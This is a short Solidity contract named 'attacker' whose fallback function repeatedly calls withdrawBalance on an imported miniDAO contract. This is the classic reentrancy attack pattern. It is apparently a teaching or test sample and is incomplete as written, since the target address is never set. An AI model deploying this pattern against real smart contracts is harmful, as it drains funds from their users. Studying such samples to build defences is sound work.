pragma solidity 0.4.18;

import "miniDAO.sol";

contract attacker
{
  miniDAO dao;

  function incr() 
  { 
    dao.withdrawBalance();
  }

  function()
  {
    incr();
  }
}
